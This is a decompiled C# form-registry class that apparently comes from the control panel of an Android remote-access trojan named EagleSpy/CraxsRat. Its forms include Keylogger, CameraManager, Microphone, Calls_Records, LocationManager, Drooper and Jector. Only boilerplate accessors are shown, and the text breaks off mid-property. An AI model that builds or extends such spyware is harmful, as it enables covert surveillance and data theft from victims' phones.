using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.ComponentModel.Design;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x020000ED RID: 237
[StandardModule]
[HideModuleName]
[GeneratedCode("MyTemplate", "11.0.0.0")]
internal sealed class MyProject
{
	// Token: 0x1700010E RID: 270
	// (get) Token: 0x0600095A RID: 2394 RVA: 0x000DFA80 File Offset: 0x000DDC80
	[HelpKeyword("My.Computer")]
	internal static MyComputer Computer
	{
		[DebuggerHidden]
		get
		{
			return MyProject.m_ComputerObjectProvider.GetInstance;
		}
	}

	// Token: 0x1700010F RID: 271
	// (get) Token: 0x0600095B RID: 2395 RVA: 0x000DFA9C File Offset: 0x000DDC9C
	[HelpKeyword("My.Application")]
	internal static MyApplication Application
	{
		[DebuggerHidden]
		get
		{
			return MyProject.m_AppObjectProvider.GetInstance;
		}
	}

	// Token: 0x17000110 RID: 272
	// (get) Token: 0x0600095C RID: 2396 RVA: 0x000DFAB8 File Offset: 0x000DDCB8
	[HelpKeyword("My.User")]
	internal static User User
	{
		[DebuggerHidden]
		get
		{
			return MyProject.m_UserObjectProvider.GetInstance;
		}
	}

	// Token: 0x17000111 RID: 273
	// (get) Token: 0x0600095D RID: 2397 RVA: 0x000DFAD4 File Offset: 0x000DDCD4
	[HelpKeyword("My.Forms")]
	internal static MyProject.MyForms Forms
	{
		[DebuggerHidden]
		get
		{
			return MyProject.m_MyFormsObjectProvider.GetInstance;
		}
	}

	// Token: 0x17000112 RID: 274
	// (get) Token: 0x0600095E RID: 2398 RVA: 0x000DFAF0 File Offset: 0x000DDCF0
	[HelpKeyword("My.WebServices")]
	internal static MyProject.MyWebServices WebServices
	{
		[DebuggerHidden]
		get
		{
			return MyProject.m_MyWebServicesObjectProvider.GetInstance;
		}
	}

	// Token: 0x04000FF8 RID: 4088
	private static readonly MyProject.ThreadSafeObjectProvider<MyComputer> m_ComputerObjectProvider = new MyProject.ThreadSafeObjectProvider<MyComputer>();

	// Token: 0x04000FF9 RID: 4089
	private static readonly MyProject.ThreadSafeObjectProvider<MyApplication> m_AppObjectProvider = new MyProject.ThreadSafeObjectProvider<MyApplication>();

	// Token: 0x04000FFA RID: 4090
	private static readonly MyProject.ThreadSafeObjectProvider<User> m_UserObjectProvider = new MyProject.ThreadSafeObjectProvider<User>();

	// Token: 0x04000FFB RID: 4091
	private static MyProject.ThreadSafeObjectProvider<MyProject.MyForms> m_MyFormsObjectProvider = new MyProject.ThreadSafeObjectProvider<MyProject.MyForms>();

	// Token: 0x04000FFC RID: 4092
	private static readonly MyProject.ThreadSafeObjectProvider<MyProject.MyWebServices> m_MyWebServicesObjectProvider = new MyProject.ThreadSafeObjectProvider<MyProject.MyWebServices>();

	// Token: 0x020000EE RID: 238
	[EditorBrowsable(EditorBrowsableState.Never)]
	[MyGroupCollection("System.Windows.Forms.Form", "Create__Instance__", "Dispose__Instance__", "My.MyProject.Forms")]
	internal sealed class MyForms
	{
		// Token: 0x17000113 RID: 275
		// (get) Token: 0x06000961 RID: 2401 RVA: 0x000DFB0C File Offset: 0x000DDD0C
		// (set) Token: 0x06000962 RID: 2402 RVA: 0x000DFB34 File Offset: 0x000DDD34
		public AccountManager AccountManager
		{
			[DebuggerHidden]
			get
			{
				this.m_AccountManager = MyProject.MyForms.Create__Instance__<AccountManager>(this.m_AccountManager);
				return this.m_AccountManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_AccountManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<AccountManager>(ref this.m_AccountManager);
				}
			}
		}

		// Token: 0x17000114 RID: 276
		// (get) Token: 0x06000963 RID: 2403 RVA: 0x000DFB6C File Offset: 0x000DDD6C
		// (set) Token: 0x06000964 RID: 2404 RVA: 0x000DFB94 File Offset: 0x000DDD94
		public AddNumber AddNumber
		{
			[DebuggerHidden]
			get
			{
				this.m_AddNumber = MyProject.MyForms.Create__Instance__<AddNumber>(this.m_AddNumber);
				return this.m_AddNumber;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_AddNumber)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<AddNumber>(ref this.m_AddNumber);
				}
			}
		}

		// Token: 0x17000115 RID: 277
		// (get) Token: 0x06000965 RID: 2405 RVA: 0x000DFBCC File Offset: 0x000DDDCC
		// (set) Token: 0x06000966 RID: 2406 RVA: 0x000DFBF4 File Offset: 0x000DDDF4
		public Apk_studio Apk_studio
		{
			[DebuggerHidden]
			get
			{
				this.m_Apk_studio = MyProject.MyForms.Create__Instance__<Apk_studio>(this.m_Apk_studio);
				return this.m_Apk_studio;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Apk_studio)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Apk_studio>(ref this.m_Apk_studio);
				}
			}
		}

		// Token: 0x17000116 RID: 278
		// (get) Token: 0x06000967 RID: 2407 RVA: 0x000DFC2C File Offset: 0x000DDE2C
		// (set) Token: 0x06000968 RID: 2408 RVA: 0x000DFC54 File Offset: 0x000DDE54
		public Apkinstaller Apkinstaller
		{
			[DebuggerHidden]
			get
			{
				this.m_Apkinstaller = MyProject.MyForms.Create__Instance__<Apkinstaller>(this.m_Apkinstaller);
				return this.m_Apkinstaller;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Apkinstaller)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Apkinstaller>(ref this.m_Apkinstaller);
				}
			}
		}

		// Token: 0x17000117 RID: 279
		// (get) Token: 0x06000969 RID: 2409 RVA: 0x000DFC8C File Offset: 0x000DDE8C
		// (set) Token: 0x0600096A RID: 2410 RVA: 0x000DFCB4 File Offset: 0x000DDEB4
		public Applications Applications
		{
			[DebuggerHidden]
			get
			{
				this.m_Applications = MyProject.MyForms.Create__Instance__<Applications>(this.m_Applications);
				return this.m_Applications;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Applications)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Applications>(ref this.m_Applications);
				}
			}
		}

		// Token: 0x17000118 RID: 280
		// (get) Token: 0x0600096B RID: 2411 RVA: 0x000DFCEC File Offset: 0x000DDEEC
		// (set) Token: 0x0600096C RID: 2412 RVA: 0x000DFD14 File Offset: 0x000DDF14
		public AppsProperties AppsProperties
		{
			[DebuggerHidden]
			get
			{
				this.m_AppsProperties = MyProject.MyForms.Create__Instance__<AppsProperties>(this.m_AppsProperties);
				return this.m_AppsProperties;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_AppsProperties)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<AppsProperties>(ref this.m_AppsProperties);
				}
			}
		}

		// Token: 0x17000119 RID: 281
		// (get) Token: 0x0600096D RID: 2413 RVA: 0x000DFD4C File Offset: 0x000DDF4C
		// (set) Token: 0x0600096E RID: 2414 RVA: 0x000DFD74 File Offset: 0x000DDF74
		public Auto_Clicker Auto_Clicker
		{
			[DebuggerHidden]
			get
			{
				this.m_Auto_Clicker = MyProject.MyForms.Create__Instance__<Auto_Clicker>(this.m_Auto_Clicker);
				return this.m_Auto_Clicker;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Auto_Clicker)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Auto_Clicker>(ref this.m_Auto_Clicker);
				}
			}
		}

		// Token: 0x1700011A RID: 282
		// (get) Token: 0x0600096F RID: 2415 RVA: 0x000DFDAC File Offset: 0x000DDFAC
		// (set) Token: 0x06000970 RID: 2416 RVA: 0x000DFDD4 File Offset: 0x000DDFD4
		public Build Build
		{
			[DebuggerHidden]
			get
			{
				this.m_Build = MyProject.MyForms.Create__Instance__<Build>(this.m_Build);
				return this.m_Build;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Build)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Build>(ref this.m_Build);
				}
			}
		}

		// Token: 0x1700011B RID: 283
		// (get) Token: 0x06000971 RID: 2417 RVA: 0x000DFE0C File Offset: 0x000DE00C
		// (set) Token: 0x06000972 RID: 2418 RVA: 0x000DFE34 File Offset: 0x000DE034
		public CallPhone CallPhone
		{
			[DebuggerHidden]
			get
			{
				this.m_CallPhone = MyProject.MyForms.Create__Instance__<CallPhone>(this.m_CallPhone);
				return this.m_CallPhone;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_CallPhone)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<CallPhone>(ref this.m_CallPhone);
				}
			}
		}

		// Token: 0x1700011C RID: 284
		// (get) Token: 0x06000973 RID: 2419 RVA: 0x000DFE6C File Offset: 0x000DE06C
		// (set) Token: 0x06000974 RID: 2420 RVA: 0x000DFE94 File Offset: 0x000DE094
		public Calls_Records Calls_Records
		{
			[DebuggerHidden]
			get
			{
				this.m_Calls_Records = MyProject.MyForms.Create__Instance__<Calls_Records>(this.m_Calls_Records);
				return this.m_Calls_Records;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Calls_Records)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Calls_Records>(ref this.m_Calls_Records);
				}
			}
		}

		// Token: 0x1700011D RID: 285
		// (get) Token: 0x06000975 RID: 2421 RVA: 0x000DFECC File Offset: 0x000DE0CC
		// (set) Token: 0x06000976 RID: 2422 RVA: 0x000DFEF4 File Offset: 0x000DE0F4
		public CallsManager CallsManager
		{
			[DebuggerHidden]
			get
			{
				this.m_CallsManager = MyProject.MyForms.Create__Instance__<CallsManager>(this.m_CallsManager);
				return this.m_CallsManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_CallsManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<CallsManager>(ref this.m_CallsManager);
				}
			}
		}

		// Token: 0x1700011E RID: 286
		// (get) Token: 0x06000977 RID: 2423 RVA: 0x000DFF2C File Offset: 0x000DE12C
		// (set) Token: 0x06000978 RID: 2424 RVA: 0x000DFF54 File Offset: 0x000DE154
		public CameraManager CameraManager
		{
			[DebuggerHidden]
			get
			{
				this.m_CameraManager = MyProject.MyForms.Create__Instance__<CameraManager>(this.m_CameraManager);
				return this.m_CameraManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_CameraManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<CameraManager>(ref this.m_CameraManager);
				}
			}
		}

		// Token: 0x1700011F RID: 287
		// (get) Token: 0x06000979 RID: 2425 RVA: 0x000DFF8C File Offset: 0x000DE18C
		// (set) Token: 0x0600097A RID: 2426 RVA: 0x000DFFB4 File Offset: 0x000DE1B4
		public ClipboardManager ClipboardManager
		{
			[DebuggerHidden]
			get
			{
				this.m_ClipboardManager = MyProject.MyForms.Create__Instance__<ClipboardManager>(this.m_ClipboardManager);
				return this.m_ClipboardManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_ClipboardManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<ClipboardManager>(ref this.m_ClipboardManager);
				}
			}
		}

		// Token: 0x17000120 RID: 288
		// (get) Token: 0x0600097B RID: 2427 RVA: 0x000DFFEC File Offset: 0x000DE1EC
		// (set) Token: 0x0600097C RID: 2428 RVA: 0x000E0014 File Offset: 0x000DE214
		public Color_Box0 Color_Box0
		{
			[DebuggerHidden]
			get
			{
				this.m_Color_Box0 = MyProject.MyForms.Create__Instance__<Color_Box0>(this.m_Color_Box0);
				return this.m_Color_Box0;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Color_Box0)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Color_Box0>(ref this.m_Color_Box0);
				}
			}
		}

		// Token: 0x17000121 RID: 289
		// (get) Token: 0x0600097D RID: 2429 RVA: 0x000E004C File Offset: 0x000DE24C
		// (set) Token: 0x0600097E RID: 2430 RVA: 0x000E0074 File Offset: 0x000DE274
		public comptableform comptableform
		{
			[DebuggerHidden]
			get
			{
				this.m_comptableform = MyProject.MyForms.Create__Instance__<comptableform>(this.m_comptableform);
				return this.m_comptableform;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_comptableform)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<comptableform>(ref this.m_comptableform);
				}
			}
		}

		// Token: 0x17000122 RID: 290
		// (get) Token: 0x0600097F RID: 2431 RVA: 0x000E00AC File Offset: 0x000DE2AC
		// (set) Token: 0x06000980 RID: 2432 RVA: 0x000E00D4 File Offset: 0x000DE2D4
		public ContactsManager ContactsManager
		{
			[DebuggerHidden]
			get
			{
				this.m_ContactsManager = MyProject.MyForms.Create__Instance__<ContactsManager>(this.m_ContactsManager);
				return this.m_ContactsManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_ContactsManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<ContactsManager>(ref this.m_ContactsManager);
				}
			}
		}

		// Token: 0x17000123 RID: 291
		// (get) Token: 0x06000981 RID: 2433 RVA: 0x000E010C File Offset: 0x000DE30C
		// (set) Token: 0x06000982 RID: 2434 RVA: 0x000E0134 File Offset: 0x000DE334
		public EagleSpyCallLogs craxscallslog
		{
			[DebuggerHidden]
			get
			{
				this.m_craxscallslog = MyProject.MyForms.Create__Instance__<EagleSpyCallLogs>(this.m_craxscallslog);
				return this.m_craxscallslog;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_craxscallslog)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<EagleSpyCallLogs>(ref this.m_craxscallslog);
				}
			}
		}

		// Token: 0x17000124 RID: 292
		// (get) Token: 0x06000983 RID: 2435 RVA: 0x000E016C File Offset: 0x000DE36C
		// (set) Token: 0x06000984 RID: 2436 RVA: 0x000E0194 File Offset: 0x000DE394
		public Eaglepopup Craxspopup
		{
			[DebuggerHidden]
			get
			{
				this.m_Craxspopup = MyProject.MyForms.Create__Instance__<Eaglepopup>(this.m_Craxspopup);
				return this.m_Craxspopup;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Craxspopup)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Eaglepopup>(ref this.m_Craxspopup);
				}
			}
		}

		// Token: 0x17000125 RID: 293
		// (get) Token: 0x06000985 RID: 2437 RVA: 0x000E01CC File Offset: 0x000DE3CC
		// (set) Token: 0x06000986 RID: 2438 RVA: 0x000E01F4 File Offset: 0x000DE3F4
		public EagleSpyMain CraxsRatMain
		{
			[DebuggerHidden]
			get
			{
				this.m_CraxsRatMain = MyProject.MyForms.Create__Instance__<EagleSpyMain>(this.m_CraxsRatMain);
				return this.m_CraxsRatMain;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_CraxsRatMain)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<EagleSpyMain>(ref this.m_CraxsRatMain);
				}
			}
		}

		// Token: 0x17000126 RID: 294
		// (get) Token: 0x06000987 RID: 2439 RVA: 0x000E022C File Offset: 0x000DE42C
		// (set) Token: 0x06000988 RID: 2440 RVA: 0x000E0254 File Offset: 0x000DE454
		public EagleSpySettinngs CraxsSettings
		{
			[DebuggerHidden]
			get
			{
				this.m_CraxsSettings = MyProject.MyForms.Create__Instance__<EagleSpySettinngs>(this.m_CraxsSettings);
				return this.m_CraxsSettings;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_CraxsSettings)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<EagleSpySettinngs>(ref this.m_CraxsSettings);
				}
			}
		}

		// Token: 0x17000127 RID: 295
		// (get) Token: 0x06000989 RID: 2441 RVA: 0x000E028C File Offset: 0x000DE48C
		// (set) Token: 0x0600098A RID: 2442 RVA: 0x000E02B4 File Offset: 0x000DE4B4
		public Dialog1 Dialog1
		{
			[DebuggerHidden]
			get
			{
				this.m_Dialog1 = MyProject.MyForms.Create__Instance__<Dialog1>(this.m_Dialog1);
				return this.m_Dialog1;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Dialog1)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Dialog1>(ref this.m_Dialog1);
				}
			}
		}

		// Token: 0x17000128 RID: 296
		// (get) Token: 0x0600098B RID: 2443 RVA: 0x000E02EC File Offset: 0x000DE4EC
		// (set) Token: 0x0600098C RID: 2444 RVA: 0x000E0314 File Offset: 0x000DE514
		public Dialog2 Dialog2
		{
			[DebuggerHidden]
			get
			{
				this.m_Dialog2 = MyProject.MyForms.Create__Instance__<Dialog2>(this.m_Dialog2);
				return this.m_Dialog2;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Dialog2)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Dialog2>(ref this.m_Dialog2);
				}
			}
		}

		// Token: 0x17000129 RID: 297
		// (get) Token: 0x0600098D RID: 2445 RVA: 0x000E034C File Offset: 0x000DE54C
		// (set) Token: 0x0600098E RID: 2446 RVA: 0x000E0374 File Offset: 0x000DE574
		public DialogPloice DialogPloice
		{
			[DebuggerHidden]
			get
			{
				this.m_DialogPloice = MyProject.MyForms.Create__Instance__<DialogPloice>(this.m_DialogPloice);
				return this.m_DialogPloice;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_DialogPloice)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<DialogPloice>(ref this.m_DialogPloice);
				}
			}
		}

		// Token: 0x1700012A RID: 298
		// (get) Token: 0x0600098F RID: 2447 RVA: 0x000E03AC File Offset: 0x000DE5AC
		// (set) Token: 0x06000990 RID: 2448 RVA: 0x000E03D4 File Offset: 0x000DE5D4
		public Download Download
		{
			[DebuggerHidden]
			get
			{
				this.m_Download = MyProject.MyForms.Create__Instance__<Download>(this.m_Download);
				return this.m_Download;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Download)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Download>(ref this.m_Download);
				}
			}
		}

		// Token: 0x1700012B RID: 299
		// (get) Token: 0x06000991 RID: 2449 RVA: 0x000E040C File Offset: 0x000DE60C
		// (set) Token: 0x06000992 RID: 2450 RVA: 0x000E0434 File Offset: 0x000DE634
		public Drooper Drooper
		{
			[DebuggerHidden]
			get
			{
				this.m_Drooper = MyProject.MyForms.Create__Instance__<Drooper>(this.m_Drooper);
				return this.m_Drooper;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Drooper)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Drooper>(ref this.m_Drooper);
				}
			}
		}

		// Token: 0x1700012C RID: 300
		// (get) Token: 0x06000993 RID: 2451 RVA: 0x000E046C File Offset: 0x000DE66C
		// (set) Token: 0x06000994 RID: 2452 RVA: 0x000E0494 File Offset: 0x000DE694
		public Editor Editor
		{
			[DebuggerHidden]
			get
			{
				this.m_Editor = MyProject.MyForms.Create__Instance__<Editor>(this.m_Editor);
				return this.m_Editor;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Editor)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Editor>(ref this.m_Editor);
				}
			}
		}

		// Token: 0x1700012D RID: 301
		// (get) Token: 0x06000995 RID: 2453 RVA: 0x000E04CC File Offset: 0x000DE6CC
		// (set) Token: 0x06000996 RID: 2454 RVA: 0x000E04F4 File Offset: 0x000DE6F4
		public EditSocket EditSocket
		{
			[DebuggerHidden]
			get
			{
				this.m_EditSocket = MyProject.MyForms.Create__Instance__<EditSocket>(this.m_EditSocket);
				return this.m_EditSocket;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_EditSocket)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<EditSocket>(ref this.m_EditSocket);
				}
			}
		}

		// Token: 0x1700012E RID: 302
		// (get) Token: 0x06000997 RID: 2455 RVA: 0x000E052C File Offset: 0x000DE72C
		// (set) Token: 0x06000998 RID: 2456 RVA: 0x000E0554 File Offset: 0x000DE754
		public Faker Faker
		{
			[DebuggerHidden]
			get
			{
				this.m_Faker = MyProject.MyForms.Create__Instance__<Faker>(this.m_Faker);
				return this.m_Faker;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Faker)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Faker>(ref this.m_Faker);
				}
			}
		}

		// Token: 0x1700012F RID: 303
		// (get) Token: 0x06000999 RID: 2457 RVA: 0x000E058C File Offset: 0x000DE78C
		// (set) Token: 0x0600099A RID: 2458 RVA: 0x000E05B4 File Offset: 0x000DE7B4
		public FileManager FileManager
		{
			[DebuggerHidden]
			get
			{
				this.m_FileManager = MyProject.MyForms.Create__Instance__<FileManager>(this.m_FileManager);
				return this.m_FileManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_FileManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<FileManager>(ref this.m_FileManager);
				}
			}
		}

		// Token: 0x17000130 RID: 304
		// (get) Token: 0x0600099B RID: 2459 RVA: 0x000E05EC File Offset: 0x000DE7EC
		// (set) Token: 0x0600099C RID: 2460 RVA: 0x000E0614 File Offset: 0x000DE814
		public Icons Icons
		{
			[DebuggerHidden]
			get
			{
				this.m_Icons = MyProject.MyForms.Create__Instance__<Icons>(this.m_Icons);
				return this.m_Icons;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Icons)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Icons>(ref this.m_Icons);
				}
			}
		}

		// Token: 0x17000131 RID: 305
		// (get) Token: 0x0600099D RID: 2461 RVA: 0x000E064C File Offset: 0x000DE84C
		// (set) Token: 0x0600099E RID: 2462 RVA: 0x000E0674 File Offset: 0x000DE874
		public information information
		{
			[DebuggerHidden]
			get
			{
				this.m_information = MyProject.MyForms.Create__Instance__<information>(this.m_information);
				return this.m_information;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_information)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<information>(ref this.m_information);
				}
			}
		}

		// Token: 0x17000132 RID: 306
		// (get) Token: 0x0600099F RID: 2463 RVA: 0x000E06AC File Offset: 0x000DE8AC
		// (set) Token: 0x060009A0 RID: 2464 RVA: 0x000E06D4 File Offset: 0x000DE8D4
		public inp inp
		{
			[DebuggerHidden]
			get
			{
				this.m_inp = MyProject.MyForms.Create__Instance__<inp>(this.m_inp);
				return this.m_inp;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_inp)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<inp>(ref this.m_inp);
				}
			}
		}

		// Token: 0x17000133 RID: 307
		// (get) Token: 0x060009A1 RID: 2465 RVA: 0x000E070C File Offset: 0x000DE90C
		// (set) Token: 0x060009A2 RID: 2466 RVA: 0x000E0734 File Offset: 0x000DE934
		public Jector Jector
		{
			[DebuggerHidden]
			get
			{
				this.m_Jector = MyProject.MyForms.Create__Instance__<Jector>(this.m_Jector);
				return this.m_Jector;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Jector)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Jector>(ref this.m_Jector);
				}
			}
		}

		// Token: 0x17000134 RID: 308
		// (get) Token: 0x060009A3 RID: 2467 RVA: 0x000E076C File Offset: 0x000DE96C
		// (set) Token: 0x060009A4 RID: 2468 RVA: 0x000E0794 File Offset: 0x000DE994
		public KeyboardManager KeyboardManager
		{
			[DebuggerHidden]
			get
			{
				this.m_KeyboardManager = MyProject.MyForms.Create__Instance__<KeyboardManager>(this.m_KeyboardManager);
				return this.m_KeyboardManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_KeyboardManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<KeyboardManager>(ref this.m_KeyboardManager);
				}
			}
		}

		// Token: 0x17000135 RID: 309
		// (get) Token: 0x060009A5 RID: 2469 RVA: 0x000E07CC File Offset: 0x000DE9CC
		// (set) Token: 0x060009A6 RID: 2470 RVA: 0x000E07F4 File Offset: 0x000DE9F4
		public Keylogger Keylogger
		{
			[DebuggerHidden]
			get
			{
				this.m_Keylogger = MyProject.MyForms.Create__Instance__<Keylogger>(this.m_Keylogger);
				return this.m_Keylogger;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Keylogger)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Keylogger>(ref this.m_Keylogger);
				}
			}
		}

		// Token: 0x17000136 RID: 310
		// (get) Token: 0x060009A7 RID: 2471 RVA: 0x000E082C File Offset: 0x000DEA2C
		// (set) Token: 0x060009A8 RID: 2472 RVA: 0x000E0854 File Offset: 0x000DEA54
		public LanguageSelector LanguageSelector
		{
			[DebuggerHidden]
			get
			{
				this.m_LanguageSelector = MyProject.MyForms.Create__Instance__<LanguageSelector>(this.m_LanguageSelector);
				return this.m_LanguageSelector;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_LanguageSelector)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<LanguageSelector>(ref this.m_LanguageSelector);
				}
			}
		}

		// Token: 0x17000137 RID: 311
		// (get) Token: 0x060009A9 RID: 2473 RVA: 0x000E088C File Offset: 0x000DEA8C
		// (set) Token: 0x060009AA RID: 2474 RVA: 0x000E08B4 File Offset: 0x000DEAB4
		public LocationManager LocationManager
		{
			[DebuggerHidden]
			get
			{
				this.m_LocationManager = MyProject.MyForms.Create__Instance__<LocationManager>(this.m_LocationManager);
				return this.m_LocationManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_LocationManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<LocationManager>(ref this.m_LocationManager);
				}
			}
		}

		// Token: 0x17000138 RID: 312
		// (get) Token: 0x060009AB RID: 2475 RVA: 0x000E08EC File Offset: 0x000DEAEC
		// (set) Token: 0x060009AC RID: 2476 RVA: 0x000E0914 File Offset: 0x000DEB14
		public Microphone Microphone
		{
			[DebuggerHidden]
			get
			{
				this.m_Microphone = MyProject.MyForms.Create__Instance__<Microphone>(this.m_Microphone);
				return this.m_Microphone;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_Microphone)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<Microphone>(ref this.m_Microphone);
				}
			}
		}

		// Token: 0x17000139 RID: 313
		// (get) Token: 0x060009AD RID: 2477 RVA: 0x000E094C File Offset: 0x000DEB4C
		// (set) Token: 0x060009AE RID: 2478 RVA: 0x000E0974 File Offset: 0x000DEB74
		public nonetform nonetform
		{
			[DebuggerHidden]
			get
			{
				this.m_nonetform = MyProject.MyForms.Create__Instance__<nonetform>(this.m_nonetform);
				return this.m_nonetform;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_nonetform)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<nonetform>(ref this.m_nonetform);
				}
			}
		}

		// Token: 0x1700013A RID: 314
		// (get) Token: 0x060009AF RID: 2479 RVA: 0x000E09AC File Offset: 0x000DEBAC
		// (set) Token: 0x060009B0 RID: 2480 RVA: 0x000E09D4 File Offset: 0x000DEBD4
		public PermissionsManager PermissionsManager
		{
			[DebuggerHidden]
			get
			{
				this.m_PermissionsManager = MyProject.MyForms.Create__Instance__<PermissionsManager>(this.m_PermissionsManager);
				return this.m_PermissionsManager;
			}
			[DebuggerHidden]
			set
			{
				if (value != this.m_PermissionsManager)
				{
					if (value != null)
					{
						throw new ArgumentException("Property can only be set to Nothing");
					}
					this.Dispose__Instance__<PermissionsManager>(ref this.m_PermissionsManager);
				}
			}
		}

		// Token: 0x1700013B RID: 315
		// (get) Token: 0x060009B1 RID: 2481 RVA: 0x000E0A0C File Offset: 0x000DEC0C
		// (set) Token: 0x060009B2 RID: 2482 RVA: 0x000E0A34 File Offset: 0x000DEC34
		public Ports Ports
		{
			[DebuggerHidden]
			get
			{
				this.m_Ports = MyProject.MyForms.Create__Instance__<Ports>(this.m_Ports);
				return this.m_Ports;
